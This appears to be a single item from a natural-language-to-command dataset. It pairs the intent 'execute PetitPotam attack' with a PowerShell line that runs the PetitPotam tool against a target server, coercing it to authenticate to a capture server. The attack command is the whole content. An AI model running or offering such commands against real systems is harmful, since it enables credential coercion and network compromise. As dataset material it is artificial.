# Natural language intent:
# Execute PetitPotam attack with specific parameters and print a message indicating the end of the attack.

& "${petitpotam_path}" ${captureServerIP} ${targetServerIP} ${efsApi} ; Write-Host "End of PetitPotam attack"
